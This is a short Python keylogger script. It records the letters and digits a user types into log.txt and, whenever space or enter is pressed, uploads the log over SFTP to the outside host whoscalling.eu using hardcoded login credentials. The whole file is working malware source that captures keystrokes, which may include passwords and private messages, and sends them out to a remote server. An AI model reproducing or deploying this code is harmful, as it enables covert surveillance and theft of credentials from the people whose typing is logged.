import os
import string
import keyboard
import paramiko


def osDetect():
    if os.name == 'nt':

        OS = '\\'
        return OS
    elif os.name == 'posix':

        OS = '/'
        return OS


def outreach():
    ssh = paramiko.SSHClient()
    ssh.load_host_keys(os.path.expanduser(os.path.join("~", ".ssh", "known_hosts")))
    ssh.connect('whoscalling.eu', username='log', password='logpass13')
    sftp = ssh.open_sftp()
    sftp.put(f'{os.getcwd()}{osDetect()}log.txt', 'log.txt')
    sftp.close()
    ssh.close()


def keylogger():

    allchars = string.ascii_lowercase + string.ascii_uppercase + string.digits

    while True:
        file = open('log.txt', 'a')

        event = keyboard.read_event()

        if event.event_type == keyboard.KEY_DOWN:
            char = keyboard.read_key()
            for i in allchars:
                if char == i:
                    file.write(char)
            

            if event.name == 'space':
                char = '\n'
                outreach()


            elif event.name == 'enter':
                char = '\n'
                outreach()

            file.close()

if __name__ == '__main__':

    keylogger()
